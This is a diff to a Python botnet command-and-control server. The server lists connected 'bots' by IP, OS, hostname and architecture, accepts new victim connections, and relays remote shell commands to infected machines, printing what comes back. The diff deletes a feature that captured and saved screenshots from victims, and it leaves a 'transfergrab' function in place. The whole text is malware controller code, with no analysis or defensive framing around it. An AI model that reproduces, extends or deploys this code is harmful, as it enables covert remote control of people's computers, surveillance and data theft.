@@ -30,7 +30,7 @@ list_of_clientaddr = []
 
 flag=True
 
-imageno=1
+
 bottable = PrettyTable(['INDEX','IP','PORT','OS','HOSTNAME','ARCH','VERSION'])
 
 
@@ -71,14 +71,6 @@ def session(conn):
 			shell=conn.recv(1024).decode()
 			print (shell)
 
-
-		elif 'screenshot' in command:
-			try:
-				screenshot(conn,command)
-			except:
-				conn.close()
-				remove(conn)
-				return
 		elif 'shell*' in command:
 			shell,comm=command.split("*")
 			if comm.startswith("cd"):
@@ -88,7 +80,6 @@ def session(conn):
 			else:
 				try:
 					conn.send(command.encode())
-	
 					shell=conn.recv(1024).decode()
 					if shell.startswith("COMMAND_NOT_FOUND"):
 						print("command not found")
@@ -284,10 +275,10 @@ def clientstatus(conn,command):
 
 
 def botconnect():
- 
+
     global flag
     while flag:
-         
+
         conn, addr = server.accept()
         list_of_clientsocket.append(conn)
         list_of_clientaddr.append(addr)
@@ -296,28 +287,6 @@ def botconnect():
             print("\n [+] incoming connection " + addr[0] + " connected")
             print(Style.RESET_ALL)
 
-def screenshot(conn,command):
-    global imageno
-    conn.send(command)
-    
-    filename="screenshot"+str(imageno)+".jpg"
-    path=os.getcwd()+"/"
-    path += filename
-    
-    f=open(path,'wb+')
-    while True:
-        bits=conn.recv(1024)
-        f.write(bits)
-                
-        if bits.endswith('DONE'):
-            
-            print(Fore.GREEN)
-            print("[+]screenshot saved at "+ path)   
-            print(Style.RESET_ALL)
-            f.close()
-            break
-    
-    imageno+=1
 
 def transfergrab(conn,command):
 	conn.send(command.encode())
